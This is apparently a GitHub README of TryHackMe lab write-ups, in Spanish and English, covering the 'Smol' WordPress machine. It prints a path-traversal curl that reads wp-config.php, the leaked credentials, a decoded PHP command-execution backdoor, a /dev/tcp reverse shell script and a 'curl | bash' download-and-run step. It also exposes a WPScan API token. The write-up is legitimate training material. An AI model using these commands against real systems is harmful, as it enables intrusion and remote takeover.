# Writeups de TryHackMe

Este repositorio contiene mis notas de aprendizaje.

## Herramientas Utilizadas
* **Escaneo:** `nmap`
* **Explotación:** `Metasploit`

### Pasos realizados
1. Enumeración de puertos.
2. Búsqueda de vulnerabilidades.
<img width="962" height="245" alt="image" src="https://github.com/user-attachments/assets/41276bdd-bef6-4abf-8496-48d68b03084c" />

```bash
hola mundo
```

# Maquina smol de Tryhacke
We are given the target on the TryHackMe page.
<img width="1011" height="113" alt="image" src="https://github.com/user-attachments/assets/95173a87-5ac5-4b49-b1a1-201aef014b81" />
* ip: 10.67.130.146

## PORT SCAN
A port scan was conducted, revealing only 2 open ports.
```bash
nmap -n -Pn -sV -sC -p- --min-rate 3000 10.67.130.146
```
<img width="777" height="307" alt="image" src="https://github.com/user-attachments/assets/6b8e669d-7aae-46ba-afab-bf8dba1ec29a" />

* SSH open
* Existing webpage, but not reachable/resolvable by the computer

<img width="690" height="281" alt="image" src="https://github.com/user-attachments/assets/661657db-83c6-4548-a7f8-2a6cab569d35" />

We will add the following host so the computer can recognize it: '10.67.130.146 www.smol.thm smol.thm'
```bash
nano /etc/hosts
```
<img width="629" height="254" alt="image" src="https://github.com/user-attachments/assets/f6f1698a-b089-4004-96d7-25f958b21b22" />

We reload the page "http://www.smol.thm"

<img width="825" height="426" alt="image" src="https://github.com/user-attachments/assets/c63198be-6a19-48a6-9217-3e1cf7ea250c" />

<img width="933" height="282" alt="image" src="https://github.com/user-attachments/assets/87005a1c-5578-4408-8aa8-27c5e58aed38" />

We will see that the page is built on WordPress, which is one of the most widely used content 
management systems. WPScan is a tool specifically designed to audit WordPress-based websites.

In this case, an API token will be used, which was obtained by registering on the WPScan website, 
allowing for }much faster enumeration.


<img width="1090" height="308" alt="image" src="https://github.com/user-attachments/assets/ac408e5c-4be0-4ddf-9f05-624159d7ece9" />

* API token: vJGaJw2bNx1BkwuvVarjWaHiMmqm5Zxn9ijIrXxryoY

```bash
wpscan --url http://www.smol.thm --api-token vJGaJw2bNx1BkwuvVarjWaHiMmqm5Zxn9ijIrXxryoY -e
```
<img width="1090" height="470" alt="image" src="https://github.com/user-attachments/assets/554a3d33-6acd-48d8-a48c-da3b8934b510" />

# Vulnerabildiad SSRF
This vulnerability was chosen because it allows the server to be deceived without requiring the website administrator to click on a link.
By visiting the page https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/,
we will find a PoC, which is basically a recipe on how to exploit this flaw.

<img width="1090" height="367" alt="image" src="https://github.com/user-attachments/assets/c5e357a5-d1b1-413b-b668-c34a18861a36" />

# Web Access-wpuser
Now, changing the address to the page and running the following command in Kali:
```bash
curl 'http://www.smol.thm//wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php'
```
<img width="881" height="459" alt="image" src="https://github.com/user-attachments/assets/f771102a-9563-47ad-a57f-19439d166a78" />

* **User**: wpuser
* **Password**: kbLSF2Vop#lw3rjDZ629*Z%G

The standard login page for WordPress sites is /wp-login.php, so we redirect the page to http://www.smol.thm/wp-login.php
and use the credentials we obtained.

While searching, it was found that in the Pages section there is something marked as “private.”
 
<img width="786" height="280" alt="image" src="https://github.com/user-attachments/assets/85514c79-79e6-41d7-bc99-c6535c4bb34e" />
 
<img width="786" height="280" alt="image" src="https://github.com/user-attachments/assets/cb5d9c6d-095f-4a91-8969-2db4eb79c6bb" />

A plugin called “Hello Dolly” is mentioned; we search for Hello Dolly on GitHub and find a hello.php file.

<img width="1090" height="222" alt="image" src="https://github.com/user-attachments/assets/64ae4a3a-9bb0-4cc9-892d-8d6eb0a357ab" />

We once again use the SSRF vulnerability to read the hello.php file.
```bash
curl 'http://www.smol.thm//wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php'
```
<img width="1090" height="284" alt="image" src="https://github.com/user-attachments/assets/f48a35ca-5685-4be5-a447-57aa3c0e7864" />

An eval command was found that drew attention because it is Base64-encoded. Using CyberChef, it was decoded and the following was found:
* **if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }**

By executing ASCII decoding and searching for 143, 155, 64, as well as 143, 6d, 144
```bash
man ascii
```
<img width="764" height="479" alt="image" src="https://github.com/user-attachments/assets/1e87732d-4200-4d1c-9f18-ed9f34389cc7" />

the parameter cmd was identified. We then return to the page and modify the URL to:
**http://www.smol.thm/wp-admin/?cmd=id**

<img width="867" height="214" alt="image" src="https://github.com/user-attachments/assets/eaf751a3-d2a7-4ec0-8392-082bc5c442a5" />

We verify that the command is executed on the page.
With this finding, we will perform a reverse shell. First, we add an IP on the tunnel we are using:
```bash
ip addr show tun0
```
<img width="1090" height="258" alt="image" src="https://github.com/user-attachments/assets/3b527fdb-2fd7-4a6e-8681-2b505f71596d" />

We create a file to open an interactive shell, redirecting the output to our IP and port 4444. This file will be called thmrev.sh:
```bash
nano thmrev.sh
```
The following content is added:
**#!/bin/bash
bash -i >& /dev/tcp/192.168.202.148/4444 0>&1**

<img width="597" height="125" alt="image" src="https://github.com/user-attachments/assets/af3d2914-6d1f-4a6a-a9e7-933cf7ebe40d" />

Now, in another terminal, we start a web server to transfer the previous file:
```bash
python3 -m http.server 80
```
<img width="944" height="167" alt="image" src="https://github.com/user-attachments/assets/65a7a050-59da-46d8-a209-5a120d742359" />

En otra abrimos un puerto de escucha para el reverse Shell
```bash
nc -lvnp 4444
```
<img width="995" height="225" alt="image" src="https://github.com/user-attachments/assets/41f96877-3ad8-4bae-823c-991b1ac7ce0c" />

Finally, we execute the following URL on the webpage to download and run the thmrev.sh file: "http://www.smol.thm/wp-admin/?cmd=curl%20192.168.202.148/thmrev.sh%20|%20bash"
By returning to the listening terminal, we will obtain the reverser shell.

<img width="842" height="309" alt="image" src="https://github.com/user-attachments/assets/b3e6ad87-0403-4ba0-a7f7-77364a1adc6a" />


















